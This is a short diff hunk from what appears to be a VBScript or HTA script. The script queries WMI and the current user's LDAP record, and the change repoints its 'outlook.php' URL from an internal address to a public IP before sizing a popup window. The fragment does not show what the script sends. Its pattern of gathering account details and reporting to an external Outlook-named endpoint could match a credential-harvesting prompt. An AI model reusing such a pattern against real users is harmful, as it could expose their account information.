@@ -103,7 +103,7 @@ Set objWMI = GetObject("winmgmts:\\" & strComputer & "\root\wmi")
 Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
 Set objUser = GetObject("LDAP://" & objSysInfo.UserName)
 
-sUrl = "http://10.1.4.62/outlook.php"
+sUrl = "http://40.124.3.163/outlook.php"
 
 intLeft = ((window.screen.width/2) - (470/2))
 intTop = ((window.screen.height/2) - (333/2))
